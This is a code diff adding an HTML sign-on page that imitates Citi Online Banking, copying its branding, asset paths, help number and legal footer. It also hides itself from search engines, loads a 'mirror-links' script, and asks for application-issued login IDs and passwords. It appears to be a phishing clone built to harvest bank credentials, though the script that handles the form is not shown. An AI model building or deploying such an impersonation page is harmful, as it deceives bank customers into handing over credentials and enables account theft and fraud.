@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sign On | Citi Online Banking</title>
+  <meta name="description" content="Sign on to Citi online banking.">
+  <meta name="robots" content="noindex,nofollow">
+  <link rel="icon" href="/content/dam/cfs/mobile/assets/CBOL/IA/Angular/assets/citiredesign.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/login/styles.css">
+  <script src="/mirror-links.js" defer></script>
+  <script src="/login/login.js" defer></script>
+</head>
+<body class="login-body">
+  <a class="skip-link" href="#main">Skip to main content</a>
+
+  <header class="site-header">
+    <div class="header-inner">
+      <a class="brand" href="/" aria-label="Citi home">
+        <img class="brand-logo" src="/content/dam/cfs/mobile/assets/CBOL/IA/Angular/assets/citiredesign.svg" alt="Citi" width="88" height="88">
+      </a>
+      <img class="fdic-badge" src="/content/dam/cfs/mobile/assets/CBOL/IA/Angular/assets/Citi_Icon_Sprite_Banner_v2.svg" alt="Citi FDIC Insured">
+      <div class="header-right">
+        <span class="secure-note">
+          <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true" focusable="false"><path fill="currentColor" d="M17 9V7a5 5 0 0 0-10 0v2H5v12h14V9h-2Zm-8-2a3 3 0 0 1 6 0v2H9V7Zm8 12H7v-8h10v8Z"/></svg>
+          Secure sign-on
+        </span>
+        <a class="back-home" href="/">Back to Home</a>
+      </div>
+    </div>
+  </header>
+
+  <main id="main" class="login-main">
+    <section class="login-card" aria-labelledby="login-title">
+      <p class="eyebrow">Citi<sup>&reg;</sup> Personal Banking</p>
+      <h1 id="login-title">Sign on to your account</h1>
+      <p class="login-sub">Use the login ID and password provided when your application was approved.</p>
+
+      <form id="login-form" novalidate autocomplete="on">
+        <div class="field">
+          <label for="login-id">Login ID</label>
+          <input id="login-id" name="loginId" type="text" inputmode="text" autocomplete="username"
+                 autocapitalize="characters" spellcheck="false" placeholder="APP-YYYYMMDD-XXXXXX" required>
+        </div>
+
+        <div class="field">
+          <label for="login-password">Password</label>
+          <div class="password-wrap">
+            <input id="login-password" name="password" type="password" autocomplete="current-password" required>
+            <button class="password-toggle" id="toggle-password" type="button" aria-pressed="false" aria-label="Show password">Show</button>
+          </div>
+        </div>
+
+        <p class="form-error" id="login-error" role="alert" hidden></p>
+
+        <button class="btn-primary" id="login-submit" type="submit">Sign On</button>
+      </form>
+
+      <div class="login-links">
+        <a href="/account-application/?mode=register">Open an account</a>
+        <span aria-hidden="true">&middot;</span>
+        <a href="/">Return to citi.com</a>
+      </div>
+
+      <p class="login-help">
+        Need help? Call <strong>1-800-374-9700</strong>, 24 hours a day, 7 days a week.
+      </p>
+    </section>
+
+    <aside class="login-aside" aria-label="Security information">
+      <span class="aside-icon" aria-hidden="true">
+        <svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
+      </span>
+      <h2>Your security comes first</h2>
+      <p>Citi will never ask you for your password by email, text, or phone. Always sign in from a page you trust.</p>
+      <ul>
+        <li>Check the address bar before you sign in.</li>
+        <li>Use a unique password you do not reuse elsewhere.</li>
+        <li>Sign out when you finish, especially on a shared device.</li>
+      </ul>
+    </aside>
+  </main>
+
+  <footer class="login-footer">
+    <p>&copy; 2026 Citigroup Inc. All rights reserved.</p>
+    <p>Citibank.com provides information about and access to accounts and financial services provided by Citibank, N.A. and its affiliates in the United States and its territories. Deposit products and services are offered by Citibank, N.A., Member FDIC.</p>
+  </footer>
+</body>
+</html>
